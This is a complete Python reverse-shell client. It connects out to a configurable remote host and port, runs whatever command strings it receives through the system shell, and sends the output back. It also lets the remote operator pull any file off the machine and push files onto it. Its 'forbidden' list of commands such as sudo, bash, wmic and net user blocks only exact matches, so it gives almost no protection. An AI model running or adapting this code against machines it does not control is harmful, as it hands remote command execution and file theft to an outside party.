import socket
import subprocess
import os 


#change RHOST due to thing you need (more info in admin script)

RHOST = "127.0.0.1"
RPORT = 5050

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#function for all commands besides cd,mkdir,rmdir,get and upload
def cmd():

    obj = subprocess.Popen(data.decode(), shell=True,
                  stdout = subprocess.PIPE,
                  stderr = subprocess.PIPE,
                  stdin = subprocess.PIPE)
 
    report_ok = obj.stdout.read()
    report_error = obj.stderr.read()
 
    print(report_ok.decode())
    print(report_error.decode())
 
    s.sendall(report_ok)
    s.sendall(report_error)

#cd command function (cd
def cd():
    try:
        os.chdir(ex_data[3:])
        s.sendall((f'Directory changed to: {ex_data[3:]}').encode())
    
    except:
        s.sendall('No such Directory'.encode())
        print('No such Directory')


#mkdir command function (makes a directory)
def mkdir():
    try:
        os.mkdir(ex_data[6:])
        s.sendall((f'Executed: {ex_data}').encode())
        print(f'Executed: {ex_data}')
    
    except:
        print("Unable to Create Directory")
        s.sendall(("Unable to Create Directory").encode())


#rmdir command function (removes a directory)
def rmdir():
    try:
        os.rmdir(ex_data[6:])
        s.sendall((f'Directory Deleted: {ex_data[7:]}').encode())
        print(f'Directory Deleted: {ex_data[7:]}')
 
    except:
        s.sendall((f'There is no such Directory named {ex_data[7:]}').encode())
        print(f'There is no such Directory named {ex_data[7:]}')


#get command function (it downloads a file from client machine
def get():
    try:
        f = open(ex_data[4:], "rb")
        data = (f.read())
        s.sendall(data)
        f.close()
 
    except:
        print("Unable to send a File")
        s.sendall((f'Unable to Get {ex_data[4:]}').encode())


#upload command function (it uploads a file to client machine
def upload():
    try:
        f = open(f'_{ex_data[7:]}', "wb")
        s.sendall("Ready".encode())
        f.write(s.recv(5000))
        f.close()
    
    except:
        print("Admin wasn't able to upload a file")
        s.sendall("File Upload Failed".encode())



print(f'[*] Established Connection: {RHOST} : {RPORT}')
s.connect((RHOST, RPORT))

while True:
    data = s.recv(5000)
    ex_data = data.decode()
    print(f'Executed: {ex_data}')
    
    #forbidden commands for admin
    #you can add more if you want or remove them..
    forbidden = ["net user","wmic","su root","su -","sudo passwd root",'sudo','bash']
    
    if not data.decode() in forbidden:
        if data.decode() == 'quit':
            break
        else:
            
            if ex_data[:2] == 'cd':
                cd()
            elif ex_data[:5] == "mkdir":
                mkdir()
            elif ex_data[:5] == 'rmdir':
                rmdir()

            elif ex_data[:3] == 'get':
                get()

            elif ex_data[:6] == "upload":
                upload()
            elif ex_data == 'quit':
                break
            else:
                cmd()                       
        
    else:
        print(f'{data.decode()} is NOT ALLOWED!')
        s.sendall('NOT ALLOWED!'.encode())
    
    
